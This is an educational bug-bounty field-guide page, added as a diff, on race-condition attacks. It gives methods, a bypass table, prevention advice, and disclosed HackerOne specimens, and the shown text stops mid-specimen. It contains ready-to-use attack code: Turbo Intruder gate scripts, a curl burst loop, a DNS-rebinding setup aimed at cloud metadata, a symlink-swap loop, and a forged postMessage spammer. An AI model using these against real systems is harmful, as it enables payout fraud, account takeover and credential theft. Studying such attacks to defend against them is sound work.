@@ -1,0 +1,733 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Race Conditions · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Race Conditions</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="on" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>Race Conditions</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>42</b></span><a class="chip lab" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Race conditions</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>A race condition is a bug where the correctness of an operation depends on the <strong>timing of two or more concurrent actions</strong>. In web apps it almost always takes the <strong>TOCTOU</strong> shape — <em>time-of-check to time-of-use</em>: the code reads state ("is this card unused?", "is this user already a member?", "does this host resolve to a safe IP?"), makes a decision, then <strong>acts on that decision as a separate, non-atomic step</strong>. There is a window between the check and the use.</p>
+<p>Fire N copies of the same request so they all land inside that window — every copy passes the check <em>before</em> any copy commits its write — and the "once only" guarantee collapses. The impact is rarely cosmetic: duplicated payouts, multi-redeemed gift cards, quota/uniqueness bypass, SSRF-filter bypass, and full account takeover all come out of the exact same primitive. The whole game is <strong>collapsing the check-then-use window to zero</strong>: gate the requests so their final bytes arrive together.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Find a check + a use that are two separate operations</strong> on the same state, with no lock, no DB unique constraint, and no idempotency key between them ("read balance → credit", "already following? → insert", "resolve host → fetch host").</li><li><strong>Capture the single legitimate request</strong> (Copy as curl / send to Turbo Intruder) — the redeem, claim, join, confirm, follow, or payout POST.</li><li><strong>Make each copy uniquely identifiable</strong> (add a <code>Test:</code> header) so you can tell winners apart in the response table.</li><li><strong>Gate N copies</strong> — queue them, hold their final bytes, release together so they hit inside the same server tick (single-packet attack on HTTP/2).</li><li><strong>Diff the result against one clean request.</strong> The tell is <em>more successes than the logic permits</em>: N × <code>200/201</code>, a balance credited N times, a counter above 1, two "confirmed" rows.</li><li><strong>Keep N small (5–30)</strong> to avoid DoS-ing the target — some races win with as few as <strong>5</strong> parallel requests. Then ask what the inflated thing <em>unlocks</em> before rating impact.</li></ol>
+<div class="callout note"><span class="ico">● NOTE</span><div>You are not looking for a payload — you are looking for a <strong>structural gap</strong>. There is no special string; the "exploit" is sending an ordinary, already-authorized request many times at once. Grep the flow for a read that decides and a write that acts as two steps.</div></div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Identify which shape the target has, then use the matching attack. The first three are pure HTTP concurrency; the rest weaponize timing without needing tight parallelism.</p>
+<h3 class="sub" id="redeem-claim-multiplier-single-use-credit">Redeem / claim multiplier (single-use credit)</h3>
+<p>Any <em>redeem/claim/apply once</em> primitive — gift cards, coupons, promos, loyalty/referral claims, one-time rewards, in-app-purchase receipts. Obtain <strong>one</strong> valid token, then gate N redemptions together. Each winner credits the balance again.</p>
+<div class="pre" data-lang="python"># Turbo Intruder — gate N identical requests, fire final bytes simultaneously
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    for i in range(30):
+        engine.queue(target.req, str(i), gate='race1')  # 'Test: %s' keeps each unique
+    engine.openGate('race1')                            # all final bytes released together
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)</div>
+<h3 class="sub" id="non-idempotent-state-transition-double-spend">Non-idempotent state transition (double-spend)</h3>
+<p>Any endpoint that moves money/credits on a <strong>one-time state change</strong> — <code>confirm</code>, <code>claim</code>, <code>payout</code>, <code>approve</code>, <code>cashout</code>. If it lacks an idempotency guard, N parallel confirmations each disburse. No Turbo Intruder needed for slower transitions — a shell <code>&amp;</code> burst wins:</p>
+<div class="pre" data-lang="bash"># background-parallel replay of the same authorized confirm/payout request
+for i in $(seq 1 20); do curl '&lt;COPY-AS-CURL request&gt;' &amp; done; wait</div>
+<h3 class="sub" id="quota-uniqueness-bypass-check-then-insert">Quota / uniqueness bypass (check-then-insert)</h3>
+<p>"Max N per account" gates, "already a member?" joins, follow/like/vote counters — anything guarded by an app-level <code>SELECT</code>-then-<code>INSERT</code> with no DB unique constraint. Parallel inserts each pass the read and create duplicate rows, which can leave <strong>irremovable / corrupt state</strong>, not just a bad count.</p>
+<div class="pre" data-lang="http">POST /group/post_join HTTP/1.1
+Host: TARGET
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;session&gt;
+
+csrf=&lt;csrf&gt;&amp;invite=&lt;invite-token&gt;
+# fire ~5-30 copies via Turbo Intruder gate -&gt; duplicate membership rows</div>
+<h3 class="sub" id="verify-then-use-on-the-same-identifier-toctou">Verify-then-use on the same identifier (TOCTOU)</h3>
+<p>A token is issued bound to your <em>current</em> value (email/phone), but the value can be mutated separately. Confirm an identifier you don't own by racing the confirm against the change. This is the shape that reaches <strong>account takeover</strong>.</p>
+<div class="pre" data-lang="http"># (a) issue token for an address you own, hold the confirm link
+# (b) change the account value to VICTIM's, release, then within ~ms open (a)
+GET /confirm-email?token=&lt;token-issued-for-attacker-owned-addr&gt; HTTP/1.1
+Host: TARGET
+# the token validates against the account's now-racing (victim) value</div>
+<h3 class="sub" id="provisioning-window-toctou">Provisioning-window TOCTOU</h3>
+<p>A resource exists but its entitlement/ownership check hasn't finalized. Pre-stage the privileged call, grab the new object id from an intermediate response, and fire before install/checkout completes.</p>
+<div class="pre" data-lang="js">// pre-stage in DevTools, then race the privileged mutation against the new id
+fetch("/admin/api/unversioned/graphql", {method:"POST", credentials:"include",
+  headers:{"content-type":"application/json"},
+  body:JSON.stringify({operationName:"ThemePublishLegacy",
+    variables:{id:"gid://shopify/OnlineStoreTheme/&lt;THEME_ID&gt;"},
+    query:"mutation ThemePublishLegacy($id:ID!){onlineStoreThemePublish(id:$id){theme{id}userErrors{message}}}"})})</div>
+<h3 class="sub" id="dns-host-re-resolution-toctou">DNS / host re-resolution TOCTOU</h3>
+<p>Code resolves a hostname once to validate against an allowlist and again to make the request. No timing precision — just make the two resolutions differ. This turns a host allowlist / SSRF filter into a race.</p>
+<div class="pre" data-lang="bash"># authoritative DNS for a delegated zone, TTL 0, alternating A records:
+#   query 1 -&gt; 203.0.113.10     (passes the allowlist / SSRF filter)
+#   query 2 -&gt; 169.254.169.254  (used for the actual fetch) -&gt; cloud metadata / localhost
+curl localhost:8001/api/v1/nodes/toctou:80/proxy/</div>
+<h3 class="sub" id="filesystem-stat-access-then-open-native-code">Filesystem <code>stat/access</code>-then-<code>open</code> (native code)</h3>
+<p>Any <code>lstat/stat/access(path)</code> followed by a separate <code>open/fopen(path)</code> re-resolves the path each syscall. Atomically swap a name between the two with <code>RENAME_EXCHANGE</code> so the check sees one object and the use sees another.</p>
+<div class="pre" data-lang="bash"># tight loop atomically flips symlink&lt;-&gt;dir between the victim's stat() and fopen()
+while :; do renameexch a b; done   # SYS_renameat2 RENAME_EXCHANGE on names a,b
+# victim: curl --cookie-jar a URL   (also affects HSTS / alt-svc file writes)</div>
+<h3 class="sub" id="client-side-event-race">Client-side event race</h3>
+<p>A <code>postMessage</code> / ajax handler that acts on message data with no origin check can be beaten by <strong>spamming your forged message ahead of the slow legitimate cross-frame reply</strong> — pure browser, no proxy.</p>
+<div class="pre" data-lang="js">// spam a forged success message every 10ms to win vs the real network round-trip
+setInterval(() =&gt; victim.postMessage(
+ '{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"https://COLLAB/"}}}', '*'), 10);</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Use the <strong>gate</strong> technique (Turbo Intruder <code>gate='race1'</code>, or Burp Repeater "send group in parallel" / single-packet attack) to align the <em>final bytes</em> of many requests. Aligning connection setup is not enough — the whole point is that the last byte of every request arrives in the same tick.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>App-level "already used?" gate</td><td>gate N redemptions together — all pass the check before any write</td><td>#759247, #331940</td></tr><tr><td>"Max N per account" quota</td><td>parallel resource creation before the counter increments</td><td>#1913309, #3104355</td></tr><tr><td>App "already member?" check</td><td>missing DB unique constraint → parallel inserts create duplicate rows</td><td>#604534, #1285538</td></tr><tr><td>Idempotency assumption</td><td>fire confirm/payout N× in parallel before the state flips</td><td>#429026</td></tr><tr><td>Coupon / promo single-use</td><td>stack one code by racing the redemption check (two browser tabs suffice)</td><td>#1717650, #157996</td></tr><tr><td>Verify-vs-edit on same identifier</td><td>race confirm link against the value-change → confirm an unowned email</td><td>#300305</td></tr><tr><td>Entitlement enforced only at creation</td><td>fire privileged mutation in the provisioning window</td><td>#953083</td></tr><tr><td>SSRF / host allowlist</td><td>0-TTL rotating DNS: safe IP to the check, forbidden IP to the fetch</td><td>#859962</td></tr><tr><td><code>stat()</code> follows symlinks</td><td>present a dir to <code>stat()</code>, a symlink to <code>fopen()</code> via <code>RENAME_EXCHANGE</code></td><td>#2039870</td></tr><tr><td>Library "doesn't follow symlinks"</td><td>swap subdir→symlink mid-walk; a pre-check cannot fix a TOCTOU</td><td>#1520931</td></tr><tr><td>OAuth token revocation</td><td>race the mint endpoint to issue multiple valid tokens</td><td>#55140</td></tr><tr><td><code>postMessage</code> handler</td><td>spam forged message ahead of the real one (no origin check)</td><td>#381356</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>A counter that merely reads "1000 likes" instead of "1" is <strong>not</strong> a finding by itself — triagers close cosmetic count inflation as informative. Never stop at the inflated number: chase what it unlocks (invite thresholds, credit balance, undeletable state, an entitlement) and report <em>that</em>.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>Always ask <em>what the inflated / duplicated thing unlocks</em> before rating the race:</p>
+<ul><li><strong>Verify-then-use → account / store takeover</strong> (#300305) — a TOCTOU on confirm-vs-edit confirms a victim's email on your account, auto-linking their staff account as your collaborator: <code>$15,250</code> critical from a timing bug.</li><li><strong>Points / reputation inflation → real privilege</strong> (#454949) — replayed submissions crossed an invite threshold, unlocking private programs. A scoreboard bug became access.</li><li><strong>DNS TOCTOU → SSRF → cloud metadata</strong> (#859962) — the allowlist bypass reaches <code>169.254.169.254</code>; chains into the SSRF playbook.</li><li><strong>Duplicate rows → irremovable member / self-DoS</strong> (#604534) — corrupt state becomes a persistence and denial primitive, not a cosmetic dupe.</li><li><strong>Non-idempotent payout → real duplicated bank transfers</strong> (#429026) — went unnoticed for weeks by both sides.</li><li><strong>Symlink race → arbitrary file delete/overwrite → local privesc</strong> (#1520931, #2039870), and a servlet write race → <strong>JSP RCE</strong> (#2905013).</li><li><strong>Token mint race defeats revocation</strong> (#55140); a <strong>permission race during a repo transfer → covert persistent admin</strong> (#2216036).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Atomic check-and-mark</strong> — a single DB statement, <code>SELECT … FOR UPDATE</code> row lock, or conditional <code>UPDATE … WHERE status='unused'</code>. The guard and the write must be one transaction; if the update affects 0 rows, reject.</li><li><strong>DB unique constraints</strong> on relationship / redemption / join tables — not an app-level "already exists?" read. With the constraint, parallel inserts just error out.</li><li><strong>Idempotency keys</strong> on every money / state-transition endpoint, so replays are no-ops.</li><li><strong>Resolve-once-and-pin</strong> for host allowlists — validate and connect using the <em>same</em> resolved IP; never re-resolve between check and fetch.</li><li><strong><code>openat</code> / <code>*at()</code> on a pinned fd + <code>O_NOFOLLOW</code></strong> for filesystem ops — a pre-<code>stat()</code> cannot fix a TOCTOU because the kernel re-resolves the path each syscall.</li><li><strong>Enforce entitlement at the point of use</strong>, not only at resource creation.</li><li><strong>Origin allowlist</strong> on <code>postMessage</code> handlers before acting on the data.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Turbo Intruder</strong> — the <code>gate='race1'</code> technique; single-packet attack for HTTP/2.</li><li><strong>Burp Repeater</strong> — "send group in parallel" for a quick low-N race without scripting.</li><li><strong>Race The Web</strong> — purpose-built parallel replayer, faster than Intruder for pure repeat races.</li><li><strong>Shell <code>curl … &amp;</code> bursts</strong> — enough for slower state transitions, no tooling needed.</li><li><strong>Authoritative DNS server with TTL 0</strong> — alternating A records for DNS-rebinding / host TOCTOU.</li><li><strong>Custom <code>renameat2(RENAME_EXCHANGE)</code> C loop</strong> — atomic symlink↔dir swaps for filesystem TOCTOU.</li><li><strong>Browser DevTools console</strong> — client-side and provisioning-window races (pre-staged <code>fetch</code>, spammed <code>postMessage</code>).</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>42</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-300305" style="--sv:var(--sev-crit)" data-sev="4" data-votes="270" data-bounty="15250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TOCTOU email-verification bypass -&gt; confirm arbitrary email -&gt; store takeover</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#300305</b> · shopify · 15250 · 270 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>confirm arbitrary email -&gt; partner collaborator auto-conv</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The change-email and confirm-email flows were not wrapped in a single DB transaction / row lock, so the ownership check (token issued for value A) and the underlying email value could diverge. Firing the confirm link for an email you own at the same moment the account's email is being switched to the victim's confirms an address you do not control.</p>
+<h4>Method</h4><ol><li>Change your partner-account email to an address you own; grab the confirmation link from your inbox but do NOT visit it yet.</li><li>Change your email again to the victim (store employee) address; intercept/hold this request.</li><li>Release the change-to-victim request, wait a few hundred ms (the change takes ~1100-2500 ms), then in another tab open the confirmation link from step 1.</li><li>On a win the victim email is now marked confirmed on your account.</li><li>Add the store as a managed store; the staff account with that email auto-converts to a collaborator you control.</li></ol>
+<div class="pre"># no fixed payload - timing race between:
+#  (a) GET  &lt;confirmation link for attacker-owned email&gt;
+#  (b) POST change-email -&gt; victim@store.com  (held, then released ~ms before opening (a))</div>
+<p class="insight"><b>Insight —</b> Any 'confirm ownership of email/phone' flow that (a) issues a token bound to your current value and (b) separately lets you mutate that value is race-able. Confirming an unowned identifier frequently unlocks account merges, collaborator/staff auto-linking, and full takeover. Look for verify + edit on the same identifier without a lock.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/300305" target="_blank" rel="noopener">hackerone.com/reports/300305</a></span><a class="src" href="#report-300305" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1438052" style="--sv:var(--sev-crit)" data-sev="4" data-votes="59" data-bounty="5000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TOCTOU race in faucet balance check -&gt; exceed max credit limit</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1438052</b> · cosmos · USD 5000 · 59 votes · resolved</div>
+<div class="taxo"><span>Program <b>cosmos</b></span><span>Surface <b>api</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Starport's faucet Transfer() reads the balance and then sends tokens as two non-atomic steps (backed by a non-concurrency-safe Go map); firing many requests concurrently makes several balance checks observe the pre-send balance, so total minted exceeds coins_max.</p>
+<h4>Method</h4><ol><li>Confirm the per-account limit sequentially (e.g. coins_max=11)</li><li>Send many concurrent requests (~50) to the faucet for the same address</li><li>Balance checks race the sends; account ends up with far more than the cap (e.g. 30)</li></ol>
+<div class="pre">POST / HTTP/1.1
+Host: FAUCET:4500
+Content-Type: application/json
+{"address":"TARGET_ADDRESS"}
+# fire 50x concurrently (Burp single-packet / Turbo Intruder)</div>
+<p class="insight"><b>Insight —</b> Any check-then-act over a shared limit (faucet, coupon, balance, quota, vote) is a race target. Send concurrent requests (single-packet attack) so multiple reads see the same pre-mutation state. Non-atomic read+write / non-thread-safe maps are the tell.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1438052" target="_blank" rel="noopener">hackerone.com/reports/1438052</a></span><a class="src" href="#report-1438052" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-759247" style="--sv:var(--sev-high)" data-sev="3" data-votes="304" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Gift-card multi-redeem via single-gate race</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#759247</b> · reverb · awarded · 304 votes · resolved</div>
+<div class="taxo"><span>Program <b>reverb</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Redeem lacked an atomic check-and-mark on the card token, so parallel requests all passed the 'is this card unused?' check before any marked it used (TOCTOU).</p>
+<h4>Method</h4><ol><li>Buy a gift card, capture the redeem POST</li><li>Turbo Intruder: queue ~30 identical requests behind one gate, openGate to fire simultaneously</li><li>Multiple 200 OK -&gt; balance credited N times</li></ol>
+<div class="pre">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=30, pipeline=False)
+    for i in range(30):
+        engine.queue(target.req, target.baseInput, gate='race1')
+    engine.start(timeout=5)
+    engine.openGate('race1')</div>
+<p class="insight"><b>Insight —</b> Any 'redeem once' / 'apply once' primitive (gift cards, coupons, referral credit, one-time discounts) is a race candidate: fire N concurrent redemptions gated to land together and diff the credited total.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/759247" target="_blank" rel="noopener">hackerone.com/reports/759247</a></span><a class="src" href="#report-759247" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-187134" style="--sv:var(--sev-high)" data-sev="3" data-votes="32" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Concurrent connections + ambiguous Content-Length scramble shared response buffers</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#187134</b> · portswigger · none · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>portswigger</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">When many connections are released simultaneously with an ambiguous/negative/absent Content-Length and a doctype-like body start, the extension's response handling races on shared buffers, scrambling and leaking content between different requests (memory disclosure across responses).</p>
+<h4>Method</h4><ol><li>Stand up an HTTP server that holds N connections then releases them at once</li><li>Reply to all with a bogus Content-Length (e.g. negative/-12000 or absent) and a body starting like a doctype '&lt;!...'</li><li>The client's concurrent processing scrambles buffers → data leaks between responses (potential ASLR-relevant memory recovery)</li></ol>
+<div class="pre">HTTP/1.1 200 OK\r\nContent-Length: -12000\r\nMeta:%s:%d\r\nContent-Type: text/html\r\n\r\n&lt;![a-z0-9]{1024}&gt;   # release many such conns simultaneously</div>
+<p class="insight"><b>Insight —</b> Client-side HTTP stacks that guess/mishandle Content-Length and share buffers across concurrent connections can be raced to cross-contaminate responses — a memory-disclosure primitive. Trigger with a malicious server, ambiguous length, and a doctype start; as few as 4 concurrent threads sufficed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/187134" target="_blank" rel="noopener">hackerone.com/reports/187134</a></span><a class="src" href="#report-187134" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2905013" style="--sv:var(--sev-high)" data-sev="3" data-votes="24" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Tomcat write-enabled default servlet race -&gt; JSP RCE (CVE-2024-50379)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2905013</b> · ibb · awarded · 24 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>write-enabled servlet -&gt; TOCTOU race -&gt; JSP RCE</b></span><span>Tag <b>file-upload</b></span></div>
